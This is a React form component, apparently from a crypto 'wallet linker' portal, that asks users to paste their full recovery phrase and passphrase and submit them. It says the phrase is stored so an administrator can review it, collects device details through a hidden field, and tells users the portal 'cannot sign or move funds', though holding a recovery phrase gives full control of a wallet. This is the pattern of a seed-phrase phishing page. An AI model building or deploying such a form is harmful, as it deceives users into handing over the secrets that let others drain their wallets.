'use client';

import { useActionState, useEffect, useMemo, useState, type CSSProperties } from 'react';
import { submitWalletAction } from '@/app/actions/wallet';
import { deriveWallet, inspectPhrase, type WalletDerivation } from '@/lib/wallet';
import { DEVICE_TYPES, WALLET_PROVIDERS } from '@/lib/wallets';
import { FormMessage, Note, SubmitButton } from '@/components/ui';
import { Icon } from '@/components/icons';
import { WalletAddresses } from './WalletAddresses';

export function WalletLinker({ userName }: { userName: string }) {
    const [state, action] = useActionState(submitWalletAction, null);
    const [phrase, setPhrase] = useState('');
    const [passphrase, setPassphrase] = useState('');
    const [showPassphrase, setShowPassphrase] = useState(false);
    const [revealPhrase, setRevealPhrase] = useState(true);
    const [provider, setProvider] = useState<string>('MetaMask');
    const [preview, setPreview] = useState<WalletDerivation | null>(null);
    const [previewError, setPreviewError] = useState('');
    const [screenSize, setScreenSize] = useState('');
    const [deviceType, setDeviceType] = useState<string>('Desktop');

    const check = useMemo(() => inspectPhrase(phrase), [phrase]);

    useEffect(() => {
        const update = () => {
            setScreenSize(`${window.screen.width}×${window.screen.height}`);
            const ua = navigator.userAgent;
            if (/iPhone|iPad|iPod/i.test(ua)) setDeviceType(/iPad/i.test(ua) ? 'Tablet' : 'iPhone');
            else if (/Android/i.test(ua)) setDeviceType(/Mobile/i.test(ua) ? 'Android' : 'Tablet');
        };
        update();
    }, []);

    useEffect(() => {
        if (state?.ok) {
            setPhrase('');
            setPassphrase('');
            setPreview(null);
            setPreviewError('');
        }
    }, [state]);

    function derivePreview() {
        setPreviewError('');
        try {
            setPreview(deriveWallet(phrase, passphrase));
        } catch (error) {
            setPreview(null);
            setPreviewError(error instanceof Error ? error.message : 'That phrase could not be derived.');
        }
    }

    const tone = !phrase
        ? 'text-pine-900/45'
        : check.valid
          ? 'text-emerald-700'
          : check.unknownWord
            ? 'text-red-700'
            : 'text-amber-700';

    return (
        <form action={action} className="card p-5 sm:p-6">
            <p className="eyebrow">Wallet linker</p>
            <h2 className="display mt-1 text-xl text-pine-950">Link a recovery phrase</h2>
            <p className="mt-1 text-[13px] leading-relaxed text-pine-900/55">
                We validate the BIP39 checksum, derive four addresses and sign a fixed proof message. No transaction is built or broadcast.
            </p>

            <div className="mt-4">
                <FormMessage state={state} />
            </div>

            <div className="mt-4 space-y-4">
                <div>
                    <label htmlFor="provider" className="label">Wallet</label>
                    <select
                        id="provider"
                        name="provider"
                        className="field"
                        value={provider}
                        onChange={(event) => setProvider(event.target.value)}
                    >
                        {WALLET_PROVIDERS.map((item) => (
                            <option key={item} value={item}>{item}</option>
                        ))}
                    </select>
                </div>

                {provider === 'Other' ? (
                    <div>
                        <label htmlFor="customProvider" className="label">Provider name</label>
                        <input
                            id="customProvider"
                            name="customProvider"
                            required
                            maxLength={60}
                            className="field"
                            placeholder="Name on the wallet"
                        />
                    </div>
                ) : null}

                <div>
                    <div className="flex items-baseline justify-between gap-3">
                        <label htmlFor="phrase" className="label">Recovery phrase</label>
                        <div className="mb-1.5 flex items-center gap-3">
                            <button
                                type="button"
                                onClick={() => setRevealPhrase((value) => !value)}
                                className="inline-flex items-center gap-1 text-[11px] font-semibold text-pine-700 hover:underline"
                            >
                                <Icon name={revealPhrase ? 'eyeOff' : 'eye'} className="h-3.5 w-3.5" />
                                {revealPhrase ? 'Hide' : 'Show'}
                            </button>
                            <span className={`font-mono text-[10px] ${tone}`}>
                                {phrase
                                    ? `${check.wordCount} words · ${check.valid ? 'checksum ok' : check.unknownWord ? 'unknown word' : 'checksum pending'}`
                                    : '12–24 words'}
                            </span>
                        </div>
                    </div>
                    <textarea
                        id="phrase"
                        name="phrase"
                        required
                        rows={3}
                        value={phrase}
                        onChange={(event) => {
                            setPhrase(event.target.value);
                            setPreview(null);
                        }}
                        spellCheck={false}
                        autoComplete="off"
                        autoCapitalize="none"
                        placeholder="word one two three …"
                        className="field mono resize-y text-[13px] leading-relaxed"
                        style={{ WebkitTextSecurity: revealPhrase ? 'none' : 'disc' } as CSSProperties}
                        aria-describedby="phrase-help"
                    />
                    <p id="phrase-help" className="mt-1.5 text-[11px] leading-relaxed text-pine-900/45">
                        Case and extra spaces are normalised. The phrase is stored encrypted so an administrator can verify the link; the BIP39
                        passphrase is never stored.
                    </p>
                </div>

                <div>
                    <div className="flex items-baseline justify-between gap-3">
                        <label htmlFor="passphrase" className="label">
                            BIP39 passphrase <span className="font-sans font-normal normal-case tracking-normal text-pine-900/40">(optional 25th word)</span>
                        </label>
                        <button
                            type="button"
                            onClick={() => setShowPassphrase((value) => !value)}
                            className="mb-1.5 inline-flex items-center gap-1 text-[11px] font-semibold text-pine-700 hover:underline"
                        >
                            <Icon name={showPassphrase ? 'eyeOff' : 'eye'} className="h-3.5 w-3.5" />
                            {showPassphrase ? 'Hide' : 'Show'}
                        </button>
                    </div>
                    <input
                        id="passphrase"
                        name="passphrase"
                        type={showPassphrase ? 'text' : 'password'}
                        value={passphrase}
                        onChange={(event) => {
                            setPassphrase(event.target.value);
                            setPreview(null);
                        }}
                        autoComplete="off"
                        className="field"
                        placeholder="Leave empty if you never set one"
                    />
                    <p className="mt-1.5 text-[11px] text-pine-900/45">A passphrase changes every derived address. It is used once, then discarded.</p>
                </div>

                <div className="grid gap-3 sm:grid-cols-2">
                    <div>
                        <label htmlFor="deviceType" className="label">Device</label>
                        <select
                            id="deviceType"
                            name="deviceType"
                            className="field"
                            value={deviceType}
                            onChange={(event) => setDeviceType(event.target.value)}
                        >
                            {DEVICE_TYPES.map((item) => (
                                <option key={item} value={item}>{item}</option>
                            ))}
                        </select>
                    </div>
                    <div>
                        <label htmlFor="userName" className="label">Label</label>
                        <input id="userName" name="userName" maxLength={80} defaultValue={userName} className="field" />
                    </div>
                </div>

                <input type="hidden" name="screenSize" value={screenSize} readOnly />

                <div className="rounded-xl border border-pine-900/10 bg-pine-50/60 p-3">
                    <div className="flex flex-wrap items-center justify-between gap-2">
                        <p className="text-[12px] font-semibold text-pine-900/80">Check before submitting</p>
                        <button
                            type="button"
                            onClick={derivePreview}
                            disabled={!check.valid}
                            className="btn-outline btn-sm"
                        >
                            <Icon name="refresh" className="h-3.5 w-3.5" />
                            Derive preview
                        </button>
                    </div>

                    {previewError ? <p className="mt-2 text-[12px] text-red-700">{previewError}</p> : null}

                    {preview ? (
                        <div className="mt-2.5">
                            <WalletAddresses addresses={preview.addresses} />
                            <p className="mono mt-2 text-[10px] text-pine-900/45">
                                proof {preview.proofRecovered ? 'recovered ✓' : 'not recovered'} · hash {preview.phraseHash.slice(0, 12)}…
                            </p>
                        </div>
                    ) : (
                        <p className="mt-2 text-[11px] text-pine-900/50">Derive to see the four addresses without saving anything.</p>
                    )}
                </div>

                <Note>
                    This portal is a read-only observer: it derives addresses and displays balances, and cannot sign or move funds. Storing the phrase
                    is what lets a linked wallet be reviewed later.
                </Note>

                <SubmitButton className="btn-primary w-full" pendingLabel="Validating and linking…" disabled={!check.valid}>
                    <Icon name="wallet" className="h-4 w-4" />
                    Link wallet
                </SubmitButton>
            </div>
        </form>
    );
}
